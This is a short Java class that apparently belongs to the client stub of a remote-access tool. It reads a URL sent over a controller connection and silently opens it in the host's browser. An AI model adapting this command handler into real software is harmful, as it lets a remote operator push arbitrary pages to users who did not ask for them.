package com.redpois0n.stub.packets.incoming;

import java.net.URI;

import com.redpois0n.Connection;

public class PacketVISITURL extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String url = Connection.readLine();
		try {
			java.awt.Desktop.getDesktop().browse(new URI(url));
		} catch (Exception ex) {
			
		}	
	}

}
